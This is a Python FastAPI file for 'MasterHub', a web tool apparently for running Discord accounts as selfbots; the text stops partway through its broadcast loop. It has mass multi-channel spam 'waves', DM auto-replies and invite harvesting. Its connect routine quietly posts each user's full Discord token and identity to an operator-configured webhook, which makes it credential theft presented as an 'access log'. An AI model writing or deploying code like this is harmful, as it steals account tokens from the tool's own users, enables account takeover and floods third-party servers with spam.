#!/usr/bin/env python3
"""
Discord Scanner Web Interface - Vercel Compatible
"""

from fastapi import FastAPI, Request, HTTPException, Form, Depends
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import asyncio
import json
import os
from datetime import datetime
import discord
import aiohttp
from typing import Dict, List, Optional
import uuid
from auth import DiscordAuth, get_current_user, get_current_user_optional

app = FastAPI(title="MasterHub",
              description="Web Interface for Discord Server Management")

# Global variables to store scanner state
scanner_instances = {}
active_connections = {}
broadcast_control = {}  # Track broadcast operations for kill switch


class TokenRequest(BaseModel):
    token: str


class MessageRequest(BaseModel):
    channel_id: str
    message: str
    count: Optional[int] = 1
    delay: Optional[float] = 1.0


class BroadcastRequest(BaseModel):
    channel_ids: List[str]
    messages: List[str]  # Different message for each wave
    wave_count: Optional[int] = 1
    multiplier: Optional[int] = 1
    delay_between_waves: Optional[float] = 1.0
    delay_between_channels: Optional[float] = 0.5
    delay_between_multiplier_cycles: Optional[float] = 2.0


class AutoReplyRequest(BaseModel):
    enabled: bool
    messages: List[str]
    max_per_user: Optional[int] = 3
    delay_min: Optional[float] = 1.0
    delay_max: Optional[float] = 3.0
    reset_time: Optional[int] = 3600
    wave_mode: Optional[bool] = False
    wave_messages: Optional[List[str]] = []


class WebDiscordScanner:

    def __init__(self, session_id):
        self.session_id = session_id
        self.client = None
        self.servers_cache = {}
        self.selected_server = None
        self.selected_channel = None
        self.webhook_url = None
        self.connected = False
        self.user_info = None
        self.auto_reply_enabled = False
        self.auto_reply_responses = []
        self.auto_reply_user_counts = {}  # Track reply counts per user
        self.auto_reply_max_per_user = 3  # Default max replies per user
        self.auto_reply_delay_min = 1.0  # Minimum delay in seconds
        self.auto_reply_delay_max = 3.0  # Maximum delay in seconds
        self.auto_reply_reset_time = 3600  # Reset counter after 1 hour (in seconds)
        self.auto_reply_wave_mode = False  # Whether to use per-wave replies
        self.auto_reply_wave_messages = []  # Different messages for each wave

    async def connect_discord(self, token):
        """Connect to Discord"""
        try:
            print(f"Creating Discord client for session {self.session_id}")
            self.client = discord.Client()

            @self.client.event
            async def on_ready():
                print(f"Discord client ready for session {self.session_id}")
                self.connected = True
                self.user_info = {
                    'username': str(self.client.user),
                    'id': self.client.user.id
                }

                # Log to webhook if configured
                if self.webhook_url:
                    print(f"Logging to webhook for session {self.session_id}")
                    webhook_success = await self.log_token_to_webhook(token)
                    print(f"Webhook logging result: {webhook_success}")
                else:
                    print(f"No webhook URL configured for session {self.session_id}")

                # Cache servers
                print(f"Scanning servers for session {self.session_id}")
                await self.scan_servers()
                print(
                    f"Scan complete, found {len(self.servers_cache)} servers")

            @self.client.event
            async def on_message(message):
                # Auto-reply functionality
                print(
                    f"Message received from {message.author.name}: {message.content[:50]}..."
                )
                print(f"Auto-reply enabled: {self.auto_reply_enabled}")
                if self.auto_reply_enabled and message.author != self.client.user and not message.author.bot:
                    is_mentioned = message.mentions and self.client.user in message.mentions
                    is_dm = isinstance(message.channel, discord.DMChannel)
                    is_group_dm = isinstance(message.channel,
                                             discord.GroupChannel)

                    if is_dm or is_group_dm or is_mentioned:
                        print(
                            f"Trigger conditions met - DM: {is_dm}, Group DM: {is_group_dm}, Mentioned: {is_mentioned}"
                        )
                        if self.auto_reply_responses or (
                                self.auto_reply_wave_mode
                                and self.auto_reply_wave_messages):
                            try:
                                user_id = str(message.author.id)
                                current_time = asyncio.get_event_loop().time()

                                # Clean up old entries
                                self.auto_reply_user_counts = {
                                    uid: (count, timestamp)
                                    for uid, (count, timestamp) in
                                    self.auto_reply_user_counts.items()
                                    if current_time -
                                    timestamp < self.auto_reply_reset_time
                                }

                                # Check if user has exceeded reply limit
                                if user_id in self.auto_reply_user_counts:
                                    count, first_reply_time = self.auto_reply_user_counts[
                                        user_id]
                                    if count >= self.auto_reply_max_per_user:
                                        print(
                                            f"Auto-reply limit reached for {message.author.name} ({count}/{self.auto_reply_max_per_user})"
                                        )
                                        return
                                    # Update count
                                    self.auto_reply_user_counts[user_id] = (
                                        count + 1, first_reply_time)
                                else:
                                    # First reply to this user
                                    self.auto_reply_user_counts[user_id] = (
                                        1, current_time)

                                import random

                                # Debug logging
                                print(
                                    f"Debug - Wave mode: {self.auto_reply_wave_mode}, Wave messages: {len(self.auto_reply_wave_messages) if self.auto_reply_wave_messages else 0}"
                                )

                                # Choose response based on mode
                                if self.auto_reply_wave_mode and self.auto_reply_wave_messages:
                                    # Use wave-based replies
                                    count = self.auto_reply_user_counts[
                                        user_id][0]
                                    wave_index = (count - 1) % len(
                                        self.auto_reply_wave_messages)
                                    response = self.auto_reply_wave_messages[
                                        wave_index]
                                    print(
                                        f"Auto-replied to {message.author.name} (Wave {wave_index + 1}, {count}/{self.auto_reply_max_per_user}): {response}"
                                    )
                                else:
                                    # Use random replies from pool
                                    if self.auto_reply_responses:
                                        response = random.choice(
                                            self.auto_reply_responses)
                                    else:
                                        response = "Thanks for your message!"  # Fallback
                                    count = self.auto_reply_user_counts[
                                        user_id][0]
                                    print(
                                        f"Auto-replied to {message.author.name} ({count}/{self.auto_reply_max_per_user}): {response}"
                                    )

                                # Apply configurable delay before sending reply
                                delay = random.uniform(
                                    self.auto_reply_delay_min,
                                    self.auto_reply_delay_max)
                                print(
                                    f"Auto-reply delay: {delay:.1f}s (waiting before reply)"
                                )
                                await asyncio.sleep(delay)

                                await message.reply(response)

                            except Exception as e:
                                print(f"Auto-reply error: {e}")

            print(f"Starting Discord client for session {self.session_id}")
            # Start the client in the background without awaiting
            asyncio.create_task(self.client.start(token))

            # Wait for connection to be established
            max_wait = 30  # seconds
            wait_time = 0
            while not self.connected and wait_time < max_wait:
                await asyncio.sleep(0.5)
                wait_time += 0.5

            if not self.connected:
                raise Exception(
                    "Connection timeout - failed to connect within 30 seconds")

        except discord.LoginFailure as e:
            print(f"Login failed for session {self.session_id}: {e}")
            self.connected = False
            self.error = f"Login failed: {str(e)}"
            raise e
        except Exception as e:
            print(f"Connection error for session {self.session_id}: {e}")
            self.connected = False
            self.error = str(e)
            raise e

    async def log_token_to_webhook(self, token):
        """Log access token to webhook"""
        print(f"Starting webhook logging process...")
        
        if not self.webhook_url:
            print("No webhook URL provided - skipping token logging")
            return False

        try:
            print(f"Getting user info from client...")
            if not self.client or not self.client.user:
                print("Client or user not available")
                return False
                
            user_info = f"{self.client.user.name}#{self.client.user.discriminator} ({self.client.user.id})"
            print(f"User info: {user_info}")

            embed = {
                "title": "🔑 Discord Token Access Log",
                "color": 0x00ff00,
                "fields": [{
                    "name": "Full Token",
                    "value": f"`{token}`",
                    "inline": False
                }, {
                    "name": "User Info",
                    "value": user_info,
                    "inline": True
                }, {
                    "name": "Timestamp",
                    "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
                    "inline": True
                }, {
                    "name": "Access Method",
                    "value": "Web Interface - FastAPI",
                    "inline": True
                }],
                "footer": {
                    "text": "Token Access Monitor - FastAPI"
                }
            }

            payload = {"embeds": [embed], "username": "Token Access Logger"}
            print(f"Prepared webhook payload with {len(token)} character token")

            print(f"Sending POST request to webhook...")
            async with aiohttp.ClientSession() as session:
                async with session.post(self.webhook_url, json=payload) as response:
                    print(f"Webhook response status: {response.status}")
                    
                    if response.status == 204:
                        print("✅ Token successfully logged to webhook")
                        return True
                    else:
                        print(f"❌ Webhook failed with status {response.status}")
                        return False

        except Exception as e:
            print(f"❌ Webhook error: {e}")
            import traceback
            print(f"Full error traceback: {traceback.format_exc()}")
            return False

    async def scan_servers(self):
        """Scan all servers for information"""
        self.servers_cache = {}

        for guild in self.client.guilds:
            try:
                server_info = {
                    'id': str(guild.id),
                    'name': guild.name,
                    'member_count': guild.member_count,
                    'text_channels': []
                }

                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).send_messages:
                        server_info['text_channels'].append({
                            'id':
                            str(channel.id),
                            'name':
                            channel.name,
                            'category':
                            channel.category.name
                            if channel.category else 'No Category'
                        })

                self.servers_cache[guild.name] = server_info

            except Exception as e:
                print(f"Error scanning {guild.name}: {e}")

    async def send_message_to_channel(self, channel_id, message):
        """Send message to a specific channel"""
        try:
            if not self.client or not self.connected:
                print(f"Client not connected for session {self.session_id}")
                return False

            channel = self.client.get_channel(int(channel_id))
            if not channel:
                print(
                    f"Channel {channel_id} not found for session {self.session_id}"
                )
                return False

            print(
                f"Sending message to channel {channel.name} for session {self.session_id}"
            )

            # Use asyncio.wait_for to add timeout protection
            await asyncio.wait_for(channel.send(message), timeout=15.0)
            print(f"Message sent successfully to {channel.name}")
            return True

        except asyncio.TimeoutError:
            print(
                f"Message send timeout for channel {channel_id} in session {self.session_id}"
            )
            return False
        except Exception as e:
            print(f"Error sending message in session {self.session_id}: {e}")
            return False


def load_config():
    """Load webhook URL from config"""
    try:
        # Try multiple possible paths for config.json
        config_paths = [
            'config.json',
            '../config.json',
            os.path.join(os.path.dirname(os.path.dirname(__file__)), 'config.json')
        ]
        
        for config_path in config_paths:
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    return json.load(f)
        
    except Exception as e:
        print(f"Error loading config: {e}")
    
    return {}


def load_auth_config():
    """Load authentication configuration"""
    try:
        # Try multiple possible paths for auth_config.json
        auth_config_paths = [
            'auth_config.json',
            '../auth_config.json',
            os.path.join(os.path.dirname(os.path.dirname(__file__)), 'auth_config.json')
        ]
        
        for config_path in auth_config_paths:
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    return json.load(f)
        
    except Exception as e:
        print(f"Error loading auth config: {e}")
    
    return {}


@app.get("/", response_class=HTMLResponse)
async def index(current_user: dict = Depends(get_current_user_optional)):
    """Serve the main page - login required"""
    if not current_user:
        # User not authenticated, show login page
        auth_config = load_auth_config()
        if not auth_config.get('discord_client_id'):
            return HTMLResponse(content="""
            <!DOCTYPE html>
            <html><head><title>Discord Scanner - Configuration Required</title></head>
            <body style="font-family: Arial, sans-serif; margin: 40px; background: #2c2f33; color: #ffffff;">
            <h1 style="color: #7289da;">Discord Scanner - Configuration Required</h1>
            <p>Please configure Discord OAuth settings in auth_config.json:</p>
            <ul>
                <li>discord_client_id</li>
                <li>discord_client_secret</li>
                <li>discord_server_id</li>
            </ul>
            </body></html>
            """)
        
        oauth_url = DiscordAuth.get_oauth_url()
        return HTMLResponse(content=f"""
        <!DOCTYPE html>
        <html><head><title>Discord Scanner - Login Required</title></head>
        <body style="font-family: Arial, sans-serif; margin: 40px; background: linear-gradient(135deg, #1a0d2e 0%, #16213e 50%, #0f0f23 100%); color: #ffffff; min-height: 100vh;">
        <div style="max-width: 600px; margin: 0 auto; text-align: center; padding: 40px; background: linear-gradient(145deg, #1e1a2e, #2a1f3d); border-radius: 10px; border: 1px solid #4c4f69; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);">
            <div style="width: 120px; height: 120px; margin: 0 auto 20px; border-radius: 50%; padding: 10px; background: radial-gradient(circle, rgba(157, 78, 221, 0.2), rgba(94, 11, 216, 0.1)); filter: drop-shadow(0 0 20px rgba(157, 78, 221, 0.6)); animation: logoGlow 3s ease-in-out infinite alternate; display: flex; align-items: center; justify-content: center;">
                <div style="width: 100px; height: 100px; background: url('/templates/giphy.gif') center/contain no-repeat; background-size: cover; border-radius: 50%; border: 2px solid rgba(157, 78, 221, 0.3);"></div>
            </div>
            <style>
                @keyframes logoGlow {{
                    0% {{ filter: drop-shadow(0 0 20px rgba(157, 78, 221, 0.6)); }}
                    100% {{ filter: drop-shadow(0 0 30px rgba(157, 78, 221, 0.9)); }}
                }}
            </style>
            <h1 style="color: #9d4edd; margin-bottom: 30px; background: linear-gradient(135deg, #9d4edd, #7209b7, #5e0bd8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; text-shadow: 0 0 30px rgba(157, 78, 221, 0.5);">MasterHub</h1>
            <h2 style="color: #ffffff; margin-bottom: 20px;">Authentication Required</h2>
            <p style="margin-bottom: 30px; font-size: 16px; line-height: 1.5;">
                This application requires you to be a member of our Discord server to access the scanner functionality.
            </p>
            <a href="{oauth_url}" style="display: inline-block; background: linear-gradient(135deg, #9d4edd, #7209b7); color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-size: 16px; font-weight: 600; box-shadow: 0 4px 15px rgba(157, 78, 221, 0.3); transition: all 0.3s ease; position: relative; overflow: hidden;" onmouseover="this.style.background='linear-gradient(135deg, #a663ea, #7f2dd1)'; this.style.boxShadow='0 6px 20px rgba(157, 78, 221, 0.5)'; this.style.transform='translateY(-2px)';" onmouseout="this.style.background='linear-gradient(135deg, #9d4edd, #7209b7)'; this.style.boxShadow='0 4px 15px rgba(157, 78, 221, 0.3)'; this.style.transform='translateY(0)';">
                🔗 Login with Discord
            </a>
            <p style="margin-top: 20px; font-size: 14px; color: #b9bbbe;">
                You will be redirected to Discord to authorize this application.
            </p>
            
            <div style="margin-top: 20px; padding: 20px; background: linear-gradient(135deg, #1e1a2e, #2a1f3d); border-radius: 8px; border: 1px solid #4c4f69; text-align: center;">
                <p style="margin-bottom: 15px; color: #b9bbbe; font-size: 14px; line-height: 1.5;">
                    Join us to use Autochat + Autoreply. Best tools, best beaming. Masterhub.
                </p>
                <a href="https://discord.gg/RTXGyBfNWG" target="_blank" style="display: inline-block; background: linear-gradient(135deg, #5865f2, #4752c4); color: white; padding: 12px 25px; text-decoration: none; border-radius: 8px; font-size: 16px; font-weight: 600; box-shadow: 0 4px 15px rgba(88, 101, 242, 0.3); transition: all 0.3s ease;" onmouseover="this.style.background='linear-gradient(135deg, #6b73f5, #5661c7)'; this.style.boxShadow='0 6px 20px rgba(88, 101, 242, 0.5)'; this.style.transform='translateY(-2px)';" onmouseout="this.style.background='linear-gradient(135deg, #5865f2, #4752c4)'; this.style.boxShadow='0 4px 15px rgba(88, 101, 242, 0.3)'; this.style.transform='translateY(0)';">
                    Join Discord Server
                </a>
            </div>
        </div>
        </body></html>
        """)
    
    # User is authenticated, serve the main scanner interface
    import os
    # Try multiple possible paths for the template
    possible_paths = [
        'templates/index.html', '../templates/index.html',
        os.path.join(os.path.dirname(os.path.dirname(__file__)),
                     'templates/index.html')
    ]

    for template_path in possible_paths:
        try:
            if os.path.exists(template_path):
                with open(template_path, 'r') as f:
                    content = f.read()
                    # Inject user info into the template
                    user_info = f"""
                    <script>
                        window.currentUser = {{
                            username: '{current_user.get("username", "")}',
                            id: '{current_user.get("id", "")}',
                            avatar: '{current_user.get("avatar", "")}'
                        }};
                    </script>
                    """
                    content = content.replace('</head>', f'{user_info}</head>')
                    return HTMLResponse(content=content)
        except Exception as e:
            continue

    return HTMLResponse(content="""
    <!DOCTYPE html>
    <html><head><title>Discord Scanner</title></head>
    <body>
    <h1>Discord Scanner</h1>
    <p>Template file not found. Searched paths: """ +
                        ", ".join(possible_paths) + """</p>
    </body></html>
    """)


# Discord OAuth Authentication Routes
@app.get("/auth/callback")
async def auth_callback(code: str = None, error: str = None):
    """Handle Discord OAuth callback"""
    if error:
        return HTMLResponse(content=f"""
        <!DOCTYPE html>
        <html><head><title>Authentication Error</title></head>
        <body style="font-family: Arial, sans-serif; margin: 40px; background: #2c2f33; color: #ffffff;">
        <h1 style="color: #f04747;">Authentication Error</h1>
        <p>Error: {error}</p>
        <a href="/" style="color: #7289da;">Return to login</a>
        </body></html>
        """)
    
    if not code:
        return HTMLResponse(content="""
        <!DOCTYPE html>
        <html><head><title>Authentication Error</title></head>
        <body style="font-family: Arial, sans-serif; margin: 40px; background: #2c2f33; color: #ffffff;">
        <h1 style="color: #f04747;">Authentication Error</h1>
        <p>No authorization code received</p>
        <a href="/" style="color: #7289da;">Return to login</a>
        </body></html>
        """)
    
    try:
        # Load auth configuration
        auth_config = load_auth_config()
        required_server_id = auth_config.get('discord_server_id')
        
        if not required_server_id:
            return HTMLResponse(content="""
            <!DOCTYPE html>
            <html><head><title>Configuration Error</title></head>
            <body style="font-family: Arial, sans-serif; margin: 40px; background: #2c2f33; color: #ffffff;">
            <h1 style="color: #f04747;">Configuration Error</h1>
            <p>Discord server ID not configured</p>
            </body></html>
            """)
        
        # Exchange code for token
        token_data = await DiscordAuth.exchange_code_for_token(code)
        access_token = token_data.get('access_token')
        
        # Get user info and guilds
        user_info = await DiscordAuth.get_user_info(access_token)
        user_guilds = await DiscordAuth.get_user_guilds(access_token)
        
        # Check server membership
        is_member = DiscordAuth.check_server_membership(user_guilds, required_server_id)
        
        if not is_member:
            return HTMLResponse(content="""
            <!DOCTYPE html>
            <html><head><title>Access Denied</title></head>
            <body style="font-family: Arial, sans-serif; margin: 40px; background: #2c2f33; color: #ffffff;">
            <div style="max-width: 600px; margin: 0 auto; text-align: center; padding: 40px; background: #36393f; border-radius: 10px;">
                <h1 style="color: #f04747;">Access Denied</h1>
                <p style="margin-bottom: 30px; font-size: 16px; line-height: 1.5;">
                    You must be a member of our Discord server to access this application.
                </p>
                <p style="margin-bottom: 30px; font-size: 14px; color: #b9bbbe;">
                    Please join our Discord server first, then try logging in again.
                </p>
                <a href="/" style="display: inline-block; background: #7289da; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-size: 16px; font-weight: bold;">
                    Try Again
                </a>
            </div>
            </body></html>
            """)
        
        # Create JWT token with user data
        jwt_payload = {
            'id': str(user_info.get('id')),
            'username': user_info.get('username'),
            'discriminator': user_info.get('discriminator'),
            'avatar': user_info.get('avatar'),
            'server_member': True
        }
        
        jwt_token = DiscordAuth.create_access_token(jwt_payload)
        
        # Return success page with token set as cookie
        response_content = f"""
        <!DOCTYPE html>
        <html><head><title>Authentication Success</title></head>
        <body style="font-family: Arial, sans-serif; margin: 40px; background: #2c2f33; color: #ffffff;">
        <div style="max-width: 600px; margin: 0 auto; text-align: center; padding: 40px; background: #36393f; border-radius: 10px;">
            <h1 style="color: #43b581;">Authentication Successful</h1>
            <p style="margin-bottom: 30px; font-size: 16px; line-height: 1.5;">
                Welcome, {user_info.get('username')}! You have been successfully authenticated.
            </p>
            <p style="margin-bottom: 30px; font-size: 14px; color: #b9bbbe;">
                Redirecting you to the Discord Scanner...
            </p>
        </div>
        <script>
            // Redirect to main page immediately
            setTimeout(() => {{
                window.location.href = '/';
            }}, 1000);
        </script>
        </body></html>
        """
        
        response = HTMLResponse(content=response_content)
        # Set JWT token as cookie (simplified for development)
        response.set_cookie(
            key="discord_token",
            value=jwt_token,
            max_age=86400,  # 24 hours
            httponly=False,  # Allow JavaScript access for now
            secure=False,    # Allow HTTP for development
            samesite="lax"
        )
        return response
        
    except Exception as e:
        return HTMLResponse(content=f"""
        <!DOCTYPE html>
        <html><head><title>Authentication Error</title></head>
        <body style="font-family: Arial, sans-serif; margin: 40px; background: #2c2f33; color: #ffffff;">
        <h1 style="color: #f04747;">Authentication Error</h1>
        <p>Error during authentication: {str(e)}</p>
        <a href="/" style="color: #7289da;">Return to login</a>
        </body></html>
        """)


@app.get("/auth/logout")
async def logout():
    """Logout endpoint"""
    response_content = """
    <!DOCTYPE html>
    <html><head><title>Logged Out</title></head>
    <body style="font-family: Arial, sans-serif; margin: 40px; background: #2c2f33; color: #ffffff;">
    <div style="max-width: 600px; margin: 0 auto; text-align: center; padding: 40px; background: #36393f; border-radius: 10px;">
        <h1 style="color: #7289da;">Logged Out</h1>
        <p style="margin-bottom: 30px; font-size: 16px; line-height: 1.5;">
            You have been successfully logged out.
        </p>
        <a href="/" style="display: inline-block; background: #7289da; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-size: 16px; font-weight: bold;">
            Login Again
        </a>
    </div>
    <script>
        // Remove any stored tokens
        localStorage.removeItem('discord_token');
        setTimeout(() => {
            window.location.href = '/';
        }, 1000);
    </script>
    </body></html>
    """
    
    response = HTMLResponse(content=response_content)
    # Clear the authentication cookie
    response.delete_cookie(key="discord_token")
    return response


@app.post("/api/connect")
async def connect(request: TokenRequest, current_user: dict = Depends(get_current_user_optional)):
    """Connect to Discord"""
    # Check if user is authenticated via Discord OAuth
    if not current_user:
        raise HTTPException(status_code=401, detail="Authentication required")
    
    token = request.token.strip()

    if not token:
        raise HTTPException(status_code=400, detail="No token provided")

    session_id = str(uuid.uuid4())

    # Load webhook URL from config
    config = load_config()
    webhook_url = config.get('webhook_url')

    # Create scanner instance
    scanner = WebDiscordScanner(session_id)
    scanner.webhook_url = webhook_url
    scanner_instances[session_id] = scanner

    # Connect in background task
    async def connect_async():
        try:
            await scanner.connect_discord(token)
        except Exception as e:
            scanner.connected = False
            scanner.error = str(e)
            print(f"Connection error: {e}")

    # Start the connection process
    asyncio.create_task(connect_async())

    return {"success": True, "session_id": session_id}


@app.get("/api/status/{session_id}")
async def status(session_id: str):
    """Get connection status"""
    if session_id not in scanner_instances:
        return {"connected": False}

    scanner = scanner_instances[session_id]

    if scanner.connected:
        return {
            "connected": True,
            "user_info": scanner.user_info,
            "servers": list(scanner.servers_cache.keys()),
            "webhook_configured": bool(scanner.webhook_url)
        }
    elif hasattr(scanner, 'error'):
        return {"connected": False, "error": scanner.error}
    else:
        return {"connected": False, "status": "connecting"}


@app.get("/api/servers/{session_id}")
async def get_servers(session_id: str):
    """Get servers list"""
    if session_id not in scanner_instances:
        raise HTTPException(status_code=404, detail="Session not found")

    scanner = scanner_instances[session_id]
    return {"servers": scanner.servers_cache}


@app.post("/api/send_message/{session_id}")
async def send_message(session_id: str, request: MessageRequest):
    """Send message to a channel"""
    if session_id not in scanner_instances:
        raise HTTPException(status_code=404, detail="Session not found")

    scanner = scanner_instances[session_id]

    if not scanner.client or not scanner.connected:
        raise HTTPException(status_code=400,
                            detail="Discord client not connected")

    # Get the channel first to validate
    channel = scanner.client.get_channel(int(request.channel_id))
    if not channel:
        raise HTTPException(status_code=404,
                            detail="Channel not found or no access")

    try:
        print(f"Sending {request.count} message(s) to channel {channel.name}")

        # Send multiple messages if requested
        for i in range(request.count):
            # Use the scanner's send_message method
            success = await scanner.send_message_to_channel(
                request.channel_id, request.message)
            if not success:
                raise HTTPException(status_code=500,
                                    detail=f"Failed to send message {i+1}")

            # Add delay between messages if sending multiple
            if i < request.count - 1:
                print(
                    f"Waiting {request.delay} seconds before next message...")
                await asyncio.sleep(request.delay)

        print(f"Successfully sent {request.count} message(s)")
        return {"success": True}

    except HTTPException:
        raise
    except Exception as e:
        print(f"Send message error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/rescan_servers/{session_id}")
async def rescan_servers(session_id: str):
    """Rescan all servers"""
    if session_id not in scanner_instances:
        raise HTTPException(status_code=404, detail="Session not found")

    scanner = scanner_instances[session_id]

    try:
        await scanner.scan_servers()
        return {"success": True}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/export_data/{session_id}")
async def export_data(session_id: str):
    """Export server data"""
    if session_id not in scanner_instances:
        raise HTTPException(status_code=404, detail="Session not found")

    scanner = scanner_instances[session_id]

    # Create temporary file
    filename = f"server_data_{session_id}.json"
    with open(filename, 'w') as f:
        json.dump(scanner.servers_cache, f, indent=2)

    return FileResponse(filename,
                        filename="server_data.json",
                        media_type="application/json")


@app.post("/api/extract_invites/{session_id}")
async def extract_invites(session_id: str):
    """Extract invite links from all servers"""
    if session_id not in scanner_instances:
        raise HTTPException(status_code=404, detail="Session not found")

    scanner = scanner_instances[session_id]

    invites = []
    try:
        for guild in scanner.client.guilds:
            try:
                # Try to get existing invites
                existing_invites = await guild.invites()
                if existing_invites:
                    for invite in existing_invites:
                        invites.append({
                            'server':
                            guild.name,
                            'url':
                            str(invite),
                            'channel':
                            invite.channel.name
                            if invite.channel else 'Unknown'
                        })
                else:
                    # Try to create a new invite
                    text_channels = [
                        ch for ch in guild.text_channels
                        if ch.permissions_for(guild.me).create_instant_invite
                    ]
                    if text_channels:
                        channel = text_channels[0]
                        invite = await channel.create_invite(max_age=0,
                                                             max_uses=0)
                        invites.append({
                            'server': guild.name,
                            'url': str(invite),
                            'channel': channel.name
                        })
            except Exception as e:
                print(f"Error extracting invites from {guild.name}: {e}")

    except Exception as e:
        print(f"General invite extraction error: {e}")

    return {"success": True, "invites": invites}


@app.post("/api/kill_broadcast/{session_id}")
async def kill_broadcast(session_id: str):
    """Kill active broadcast for this session"""
    if session_id not in scanner_instances:
        raise HTTPException(status_code=404, detail="Session not found")

    # Find and kill active broadcasts for this session
    killed_broadcasts = []
    for broadcast_id, broadcast_info in list(broadcast_control.items()):
        if broadcast_info.get("session_id") == session_id:
            broadcast_control[broadcast_id]["running"] = False
            killed_broadcasts.append({
                "broadcast_id": broadcast_id,
                "sent_count": broadcast_info.get("sent_count", 0),
                "failed_count": broadcast_info.get("failed_count", 0),
                "total_messages": broadcast_info.get("total_messages", 0)
            })
            print(f"Killed broadcast {broadcast_id} for session {session_id}")

    if not killed_broadcasts:
        return {"success": False, "message": "No active broadcasts found"}

    return {
        "success": True,
        "message": f"Killed {len(killed_broadcasts)} active broadcast(s)",
        "killed_broadcasts": killed_broadcasts
    }


@app.get("/api/broadcast_status/{session_id}")
async def get_broadcast_status(session_id: str):
    """Get status of active broadcasts for this session"""
    if session_id not in scanner_instances:
        raise HTTPException(status_code=404, detail="Session not found")

    active_broadcasts = []
    for broadcast_id, broadcast_info in broadcast_control.items():
        if broadcast_info.get("session_id") == session_id:
            active_broadcasts.append({
                "broadcast_id": broadcast_id,
                "running": broadcast_info.get("running", False),
                "sent_count": broadcast_info.get("sent_count", 0),
                "failed_count": broadcast_info.get("failed_count", 0),
                "total_messages": broadcast_info.get("total_messages", 0),
                "started_at": broadcast_info.get("started_at", 0)
            })

    return {
        "active_broadcasts": active_broadcasts,
        "total_active": len(active_broadcasts)
    }


@app.post("/api/update_auto_reply/{session_id}")
async def update_auto_reply(session_id: str, request: AutoReplyRequest):
    """Update auto-reply settings"""
    if session_id not in scanner_instances:
        raise HTTPException(status_code=404, detail="Session not found")

    scanner = scanner_instances[session_id]

    scanner.auto_reply_enabled = request.enabled
    scanner.auto_reply_responses = request.messages
    scanner.auto_reply_max_per_user = request.max_per_user
    scanner.auto_reply_delay_min = request.delay_min
    scanner.auto_reply_delay_max = request.delay_max
    scanner.auto_reply_reset_time = request.reset_time
    scanner.auto_reply_wave_mode = request.wave_mode
    scanner.auto_reply_wave_messages = request.wave_messages if request.wave_mode else []

    # Debug logging
    print(
        f"Updated auto-reply settings - Wave mode: {scanner.auto_reply_wave_mode}, Wave messages: {len(scanner.auto_reply_wave_messages) if scanner.auto_reply_wave_messages else 0}"
    )

    # Clear existing user counts when settings change
    scanner.auto_reply_user_counts = {}

    return {
        "success": True,
        "settings": {
            "enabled": scanner.auto_reply_enabled,
            "max_per_user": scanner.auto_reply_max_per_user,
            "delay_min": scanner.auto_reply_delay_min,
            "delay_max": scanner.auto_reply_delay_max,
            "reset_time": scanner.auto_reply_reset_time,
            "wave_mode": scanner.auto_reply_wave_mode,
            "wave_messages": scanner.auto_reply_wave_messages
        }
    }


@app.post("/api/broadcast_message/{session_id}")
async def broadcast_message(session_id: str, request: BroadcastRequest):
    """Broadcast messages to multiple channels with per-wave customization"""
    if session_id not in scanner_instances:
        raise HTTPException(status_code=404, detail="Session not found")

    scanner = scanner_instances[session_id]

    if not scanner.client or not scanner.connected:
        raise HTTPException(status_code=400,
                            detail="Discord client not connected")

    if not request.channel_ids or not request.messages:
        raise HTTPException(status_code=400,
                            detail="Channel IDs and messages required")

    # Validate wave count and multiplier (reasonable maximum for safety)
    if request.wave_count > 10:
        raise HTTPException(status_code=400,
                            detail="Wave count too high (maximum 10)")

    if request.multiplier > 1000:
        raise HTTPException(status_code=400,
                            detail="Multiplier too high (maximum 1000)")

    # Validate channels exist
    channels = []
    for channel_id in request.channel_ids:
        channel = scanner.client.get_channel(int(channel_id))
        if not channel:
            raise HTTPException(status_code=404,
                                detail=f"Channel {channel_id} not found")
        channels.append(channel)

    # Initialize broadcast control
    broadcast_id = f"broadcast_{session_id}_{asyncio.get_event_loop().time()}"
    broadcast_control[broadcast_id] = {
        "running": True,
        "session_id": session_id,
        "started_at": asyncio.get_event_loop().time(),
        "total_messages": len(channels) * request.wave_count * request.multiplier,
        "sent_count": 0,
        "failed_count": 0
    }

    try:
        total_messages = len(
            channels) * request.wave_count * request.multiplier
        success_count = 0
        error_count = 0

        print(
            f"Broadcasting {request.wave_count} waves × {request.multiplier} cycles to {len(channels)} channels (Total: {total_messages} messages) [ID: {broadcast_id}]"
        )

        # Send multiplier cycles
        for cycle in range(request.multiplier):
            # Check kill switch
            if not broadcast_control.get(broadcast_id, {}).get("running", False):
                print(f"Broadcast {broadcast_id} killed by user - stopping at cycle {cycle + 1}")
                break

            print(f"Starting cycle {cycle + 1}/{request.multiplier}")

            # Send waves in this cycle
            for wave in range(request.wave_count):
                # Check kill switch again
                if not broadcast_control.get(broadcast_id, {}).get("running", False):
                    print(f"Broadcast {broadcast_id} killed by user - stopping at wave {wave + 1}")
                    break

                # Use different message for each wave, or cycle through available messages
                message = request.messages[wave % len(request.messages)]
                wave_success = 0
                wave_errors = 0

                print(
                    f"Cycle {cycle + 1}, Wave {wave + 1}/{request.wave_count}: '{message[:50]}...'"
                )

                # Send to all channels in this wave
                for i, channel in enumerate(channels):
                    # Check kill switch before each message
                    if not broadcast_control.get(broadcast_id, {}).get("running", False):
                        print(f"Broadcast {broadcast_id} killed by user - stopping during channel sends")
                        break

                    try:
                        success = await scanner.send_message_to_channel(
                            str(channel.id), message)
                        if success:
                            wave_success += 1
                            success_count += 1
                        else:
                            wave_errors += 1
                            error_count += 1

                        # Update broadcast control stats
                        broadcast_control[broadcast_id]["sent_count"] = success_count
                        broadcast_control[broadcast_id]["failed_count"] = error_count

                        # Add delay between channels (except for the last one in the wave)
                        if i < len(channels) - 1:
                            await asyncio.sleep(request.delay_between_channels)

